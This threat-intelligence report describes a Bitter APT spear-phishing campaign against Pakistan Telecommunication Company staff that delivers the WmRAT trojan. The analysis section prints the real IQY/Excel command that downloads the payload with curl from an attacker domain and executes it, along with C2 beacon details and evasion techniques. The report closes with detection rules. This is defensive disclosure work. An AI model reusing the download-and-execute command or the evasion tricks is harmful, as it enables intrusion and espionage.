Pakistan Telecommunication
Company (PTCL) Targeted by
Bitter APT During Heightened
Regional Conflict

Executive Summary

On May 7, 2025, during the active military escalation between Pakistan and India
—specifically in the context of India's military campaign 'Operation Sindoor'—,
EclecticIQ analysts observed that Bitter APT (also known as TA397) [1] very likely
targeted the Pakistan Telecommunication Company Limited (PTCL) workers [2]
in a spear phishing campaign very likely to deliver malware. Analysts assess that,
Bitter APT is very likely a South Asian state-sponsored actor, conducting cyber-
enable espionage operations by stealing state and trade secrets.

EclecticIQ and Hudson Rock researchers assess that Bitter APT very likely used
stolen email credentials from Pakistan’s Counter Terrorism Department (CTD) to
carry out the attack. The spear phishing campaign targeted PTCL personnel in

critical roles, including 5G infrastructure engineers, DevOps specialists, project
managers, and satellite communication experts.

The malicious email [3], received on Wednesday, May 7, 2025, at 12:09 PM,
contained an Internet Query (IQY) attachment with a malicious Excel macro [4].
This macro used the Windows command line (CMD) to download and execute a
variant of WmRAT [5]. Upon file execution, the attackers established a
connection to a command and control domain, previously linked to Bitter APT,
which resolved to a known associated IP address [6].

The timing of the email, coinciding with reported military confrontations between
India and Pakistan, is likely an attempt to target Pakistan’s telecommunications
sector during a period of regional tension. This timing aligns with Bitter APT’s

established pattern of strategic intelligence gathering through cyber-enabled
espionage.

Nation State APTs Leveraging Infostealers for Cyber
Enabled Espionage Operations

According to data from Hudson Rock, initial access to the Counter Terrorism
Department (CTD) email account at Islamabad Police Headquarters
(ctd@islamabadpolice.gov.pk) was very likely obtained using compromised
credentials. These credentials originated from a Pakistani machine infected with a
StealC infostealer variant and were first observed on August 13th, 2024.

Cookies recovered from the infected machine indicate that StealC infostealer
was delivered after the user downloaded “cracked” software on the same day as
the infection.

Figure 3 – Hudson Rock platform showing evidence of infostealer installation on CTD employee device.

The compromised CTD employee had experienced four previous infostealer
infections between 2022 and 2024. The most recent infection in August 2024
resulted in the exposure of the critical webmail credentials subsequently
leveraged in the May 2025 campaign.

Figure 4 - Hudson Rock platform showing infection chain in timeline; indicating active compromise since

2022.

The compromise of the CTD’s email account provided threat actors with
prolonged, privileged access to a critical Pakistani law enforcement system. This
persistent foothold allowed actors to monitor communications and, during the
India-Pakistan conflict, leverage the compromised account to craft a convincing
spear phishing email.

Abuse of IQY Extension in Windows Leads to WmRAT

Threat actors leveraged the IQY file extension in an email attachment named
“Security Brief Report.iqy” as part of the social engineering lure, designed to
appear legitimate and create an urgency to open.

Figure 5 - Spear phishing email sent from compromised Pakistan Counter Terrorism Department (CTD),

targeting Pakistan Telecommunication Company.

IQY is a legitimate Microsoft Office file format, very likely leveraged for anti-
malware and email gateway evasion purposes. IQY files can execute Excel
formulas capable of triggering system processes such as CMD or LoLBins
(Living-off-the-Land Binaries).

Upon opening the IQY attachment, the victim's system executed an Excel macro
with the following command:

cmd|' /c cd C:\\programdata & set /P=\"MZ\"<nul>b1 & curl

-o b2 https://fogomyart[.]com/vcswin & copy /b b1+b2

vcswin.exe & start /b vcswin.exe'!A0

2025/5/30 15:50 Pakistan Telecommunication Company (PTCL) Targeted by Bitter APT During Heightened Regional Conflict

This command uses the built-in Windows binary curl.exe to download a
malicious BAT script [7] from fogomyart[.]com/random.php. The script
changes the working directory to C:\ProgramData, creates an executable
header with the characters MZ - the standard signature for DOS and Windows
executables - and then downloads a payload that is disguised as a PNG image file
(vcswin.png) from the same domain.

Figure 6 - Content of the downloaded BAT file.

The script reconstructs a valid PE (Portable Executable) file by crafting an MZ
header in memory and appending it to the binary payload - a common tactic for
evasion, as the original file may appear benign without a proper header. After
downloading the payload, the script removes the fake PNG header, creating a
functional executable (WmRAT variant: vcswin.exe) and runs it silently in the
background, indicating a clear attempt to execute malicious code while avoiding
detection.

Capabilities of WmRAT Variant

2025/5/30 15:50 Pakistan Telecommunication Company (PTCL) Targeted by Bitter APT During Heightened Regional Conflict

EclecticIQ analysts observed that the payload downloaded from
fogomyart[.]com/vcswin.png is a new variant of WmRAT - a remote access
trojan designed for intelligence gathering and data exfiltration.

On December 17,2024, Proofpoint researchers observed Bitter APT used
WmRAT to target a Turkish defence-sector organization [8]. According to
reverse engineered sample (vcswin.png), analysts gathered list of WmRAT
capabilities:

Gathers username and hostname of the victim machine

Enumerates logical drives and directory contents

Uploads and downloads files

Takes screenshots of the desktop

Retrieves geolocation information

Executes commands via CMD or PowerShell

Receives and processes commands from the C2 server

Supports file exfiltration and remote file stream writing

Retrieves file timestamps and disk usage information

WmRAT establishes persistence using the Windows Registry, and launches a
secondary process named gentwin.exe from the Roaming directory. This process

2025/5/30 15:50 Pakistan Telecommunication Company (PTCL) Targeted by Bitter APT During Heightened Regional Conflict

uses cmd.exe and reg.exe to add a registry key under:

HKCU\Software\Microsoft\Windows\CurrentVersion\Run

The registry entry points to vcswin.exe in C:\ProgramData. Finally,
vcswin.exe is executed, establishing persistence for the malware to run on
system startup.

Command and Control Server Embeded Inside WmRAT
as XOR Encrypted String

EclecticIQ analysts reverse-engineered the WmRAT variant and discovered that
its command-and-control (C2) server was hidden within the rdata section of
the malware as an XOR-encrypted string.

Figure 7 - Disassembled WmRAT sample showing XOR encrypted string.

EclecticIQ analysts decrypted the string and revealed the command-and-control
(C2) domain tradesmarkets[.]greenadelhouse[.]com

Passive DNS data shows that this domain resolved to the following two IP
addresses:

185.244.151.84 on April 3, 2025, and

185.244.151.87 on May 7, 2025

185.244.151.84 previously hosted the staging domain jacknwoods[.]com
documented by Proofpoint [9] in a December 2024 campaign. Proofpoint
attributed this campaign to TA397 (also known as Bitter APT). This overlap in
infrastructure, along with the consistent use of WmRAT and tactics, strongly
supports attribution of the current activity to Bitter APT.

EclecticIQ analysts observed that WmRAT communicates with a remote C2
server using HTTP GET requests over HTTPS (port 443):

Figure 9 - C2 communication between victim device and attacker in Wireshark. Showing victim device

information sent to attacker controlled C2 in Base64 encoded format.

The malware communicates with its C2 server through a URI path designed to
blend in with legitimate web traffic: /excerorderslistoncbook.php. This
URI includes a parameter named vrocean that contains Base64-encoded data.
When decoded, this parameter reveals victim system identifiers:

BAMUDTK*Admin*Windows10Enterprise

The string serves as a unique identifier for the infected system. It contains the
host name or ID (BAMUDTK), the user role (Admin), and the operating system
version (Windows10Enterprise). Identifiers help attackers track and manage
infected hosts within their infrastructure.

2025/5/30 15:50 Pakistan Telecommunication Company (PTCL) Targeted by Bitter APT During Heightened Regional Conflict

To evade detection and mimic legitimate traffic, the request uses a spoofed
User-Agent string: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT
6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR

2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729). This User-
Agent mimics an outdated Internet Explorer browser on a Windows system,
helping the traffic blend in with common legacy enterprise environments and
potentially bypass basic network security filters.

Once this C2 check-in is complete, the malware waits remote commands from
the threat actors. These commands are typically issued over the same C2
channel and can be executed on the victim machine using either PowerShell or
the Windows command prompt.

This functionality provides attackers with remote control capabilities, allowing
them to execute arbitrary instructions, further compromise the system, or move
laterally within the network.

Infostealers to Espionage: Bitter APT Group’s Multi-
Stage Cyber Espionage Operation Against PTCL

Bitter APT’s cyber intrusion into Pakistan Telecommunication Company Limited
(PTCL) is likely a deliberate espionage campaign timed with regional conflict. As
Pakistan’s largest telecom operator—managing critical services like satellite links,
fiber-optic backbones, and 5G deployments—PTCL is an obvious high-value
target for state-backed actors seeking strategic leverage.

2025/5/30 15:50 Pakistan Telecommunication Company (PTCL) Targeted by Bitter APT During Heightened Regional Conflict

By compromising PTCL engineers, DevOps teams, and satellite specialists, Bitter
APT likely aims to gain deeper access to Pakistan’s communications
infrastructure. Such access enables:

Signals intelligence: Real-time interception of civilian, corporate, and
government communications.

Network mapping: Identifying routes, interconnects, and vulnerabilities in core
telecom infrastructure.

Supply-chain insights: Understanding foreign vendor ties, procurement
strategies, and technical dependencies.

Conflict preparation: Positioning for sabotage or disruption of telecom
services in future crises.

Metadata exploitation: Tracking personnel movements and command tempo
via encrypted traffic patterns.

EclecticIQ analysts assess that threat actors are likely pre-positioning for future
conflict. By embedding itself within PTCL during active hostilities, Bitter APT
gains a long-term asymmetric advantage: the power to monitor, disrupt in any
future escalation.

Detection Strategies

Monitor for Suspicious IQY File Execution

2025/5/30 15:50 Pakistan Telecommunication Company (PTCL) Targeted by Bitter APT During Heightened Regional Conflict

Alert on .iqy files initiating network activity or spawning processes such as
exe, powershell.exe, mshta.exe, or curl.exe.

Monitor for Office applications executing child processes (Living-off-the-
Land Binaries - LoLBins).

Endpoint and Behavioral Indicators

Detect execution of unusual commands involving curl, copy /b, or
appending MZ headers to files in C:\ProgramData.

Monitor file creation patterns involving exe and secondary persistence-
related binaries like gentwin.exe.

Registry Persistence Detection

Track modifications to the Windows Registry path:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run

for entries pointing to non-standard or suspicious executables such as
vcswin.exe.

C2 Communication Patterns

Detect outbound HTTPS traffic to suspicious domains (e.g.,
greenadelhouse[.]com) using encoded parameters such as vrocean.
